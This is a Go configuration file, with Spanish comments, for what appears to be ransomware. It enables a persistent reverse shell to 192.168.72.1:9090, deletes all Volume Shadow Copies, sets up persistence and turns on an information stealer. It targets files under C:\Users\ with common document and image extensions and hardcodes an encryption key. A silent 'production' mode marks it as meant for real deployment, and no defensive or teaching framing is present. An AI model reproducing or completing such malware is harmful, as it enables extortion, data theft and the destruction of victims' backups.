package config

const (
	EnableDebugMode          = false                                              // true = mostrar mensajes debug, false = modo silencioso (PRODUCCION)
	EnableReverseShell       = true                                               // true = activar reverse shell persistente, false = desactivar
	EnableShadowCopyDeletion = true                                               // true = eliminar todas las copias shadow, false = no eliminar
	EnablePersistence        = true                                               // true = establecer persistencia en el sistema, false = no establecer
	EnableInfoStealer        = true                                               // true = recopilar información del sistema, false = no recopilar
	ReverseShellRetryDelay   = 5                                                  // segundos entre intentos de reconexión
	ReverseShellServer       = "192.168.72.1:9090"                                // Servidor para reverse shell
	EncryptionKey            = "mi-clave-secreta-encriptacion-123"
)

var (
	TargetDirectories = []string{
		"C:\\Users\\",
	}

	Extensions = []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"}
)
